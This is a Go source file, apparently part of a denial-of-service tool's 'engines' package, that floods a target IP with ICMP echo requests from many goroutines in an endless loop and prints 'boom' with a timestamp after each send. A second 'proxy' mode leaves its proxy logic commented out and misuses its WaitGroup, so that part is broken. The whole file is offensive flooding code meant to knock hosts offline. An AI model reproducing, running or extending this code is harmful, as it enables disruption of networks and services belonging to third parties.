package engines

import (
	"fmt"
	"net"
	"sync"
	"time"

	"runtime"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

func icmp_handler(ip string) error {
	// Resolve the IP address of the destination
	dstIP := net.ParseIP(ip)

	// Create a connection to the ICMP protocol
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		return err
	}
	defer conn.Close()

	// Prepare the ICMP message
	msg := icmp.Message{
		Type: ipv4.ICMPTypeEcho,
		Code: 0,
		Body: &icmp.Echo{
			ID:   1,
			Seq:  1,
			Data: []byte("Hello, world!"),
		},
	}

	// Marshal the ICMP message into a binary format
	msgBytes, err := msg.Marshal(nil)
	if err != nil {
		return err
	}

	// Send the ICMP echo request to the destination IP address
	_, err = conn.WriteTo(msgBytes, &net.IPAddr{IP: dstIP})
	if err != nil {
		return err
	}

	// Wait for the ICMP echo response
	buf := make([]byte, 1500)
	n, _, err := conn.ReadFrom(buf)
	if err != nil {
		return err
	}

	// Unmarshal the ICMP response message
	respMsg, err := icmp.ParseMessage(ipv4.ICMPTypeEchoReply.Protocol(), buf[:n])
	if err != nil {
		return err
	}

	// Print the response message
	fmt.Printf("Received ICMP echo response from %v: %+v\n", dstIP.String(), respMsg)

	return nil
}

func icmp_proxy_handler(ip string, proxy string) error {
	// Resolve the IP address of the destination
	dstIP := net.ParseIP(ip)

	// Parse the proxy URL
	//proxyURL, err := url.Parse(proxy)
	// if err != nil {
	//     return err
	// }

	// Create a connection to the ICMP protocol
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		return err
	}
	defer conn.Close()

	// Set the proxy for the connection
	//conn.SetProxy(proxyURL)

	// Prepare the ICMP message
	msg := icmp.Message{
		Type: ipv4.ICMPTypeEcho,
		Code: 0,
		Body: &icmp.Echo{
			ID:   1,
			Seq:  1,
			Data: []byte("Hello, world!"),
		},
	}

	// Marshal the ICMP message into a binary format
	msgBytes, err := msg.Marshal(nil)
	if err != nil {
		return err
	}

	// Send the ICMP echo request to the destination IP address
	_, err = conn.WriteTo(msgBytes, &net.IPAddr{IP: dstIP})
	if err != nil {
		return err
	}

	// Wait for the ICMP echo response
	buf := make([]byte, 1500)
	n, _, err := conn.ReadFrom(buf)
	if err != nil {
		return err
	}

	// Unmarshal the ICMP response message
	respMsg, err := icmp.ParseMessage(ipv4.ICMPTypeEchoReply.Protocol(), buf[:n])
	if err != nil {
		return err
	}

	// Print the response message
	fmt.Printf("Received ICMP echo response from %v: %+v\n", dstIP.String(), respMsg)

	return nil

}

func Icmp(ip string, proxys []string, cpu int) {
	if len(proxys) == 0 {
		runtime.GOMAXPROCS(runtime.NumCPU())
		for {
			var wg sync.WaitGroup
			for i := 0; i < cpu; i++ {
				wg.Add(1)
				go func() {
					//use func handler
					code := icmp_handler(ip)
					fmt.Println(code, " boom :", time.Now().Format("15:04:05.000"))
					wg.Done()
				}()
			}
			wg.Wait()
			fmt.Println("All threads are dead, restarting")
		}
	}

	if len(proxys) > 0 {
		runtime.GOMAXPROCS(cpu)
		wg := sync.WaitGroup{}
		for {
			wg.Add(1)
			for _, proxy := range proxys {
				var wg sync.WaitGroup
				go func() {
					//use func handler
					code := icmp_proxy_handler(ip, proxy)
					fmt.Println(code, " boom :", time.Now().Format("15:04:05.000"))
					wg.Done()
				}()
				fmt.Println("All threads are dead, restarting")
			}
			wg.Wait()
		}
	}

}
